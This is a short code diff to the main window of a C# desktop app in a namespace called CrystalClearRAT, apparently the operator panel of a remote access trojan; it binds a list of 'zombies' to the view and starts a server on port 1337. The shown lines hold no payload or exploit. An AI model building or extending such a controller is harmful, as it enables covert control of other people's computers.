@@ -28,11 +28,13 @@ namespace CrystalClearRAT
         public MainWindow()
         {
             InitializeComponent();
+            zombieListView.ItemsSource = Zombie.Zombies;
         }
 
         private void Grid_Loaded(object sender, RoutedEventArgs e)
         {
             Server.Start(1337);
+
             //  Console.WriteLine(CrystalRATShared.Test.Hello);
 
             // Thread.Sleep(10);
